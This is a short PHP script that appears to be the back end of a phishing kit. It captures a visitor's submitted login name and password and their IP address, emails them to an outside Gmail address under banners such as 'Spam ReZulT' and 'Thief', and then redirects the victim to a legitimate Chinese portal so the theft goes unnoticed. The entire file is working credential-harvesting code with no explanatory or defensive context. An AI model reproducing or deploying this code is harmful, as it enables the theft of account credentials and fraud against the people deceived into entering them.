<?

$ip = getenv("REMOTE_ADDR");
$message .= "------------- ChinA Random - Spam ReZulT-----------------------\n";
$message .= "Access ID : ".$_POST['ctl00$MPH$txtUserName']."\n";
$message .= "passwd : ".$_POST['ctl00$MPH$txtPassword']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Emp0w3r3d By Mr.Br0wN-----------------------------\n";

$recipient = "manjafrank1900@gmail.com";
$subject = "Ch!nA - User";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.163.com/ ");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>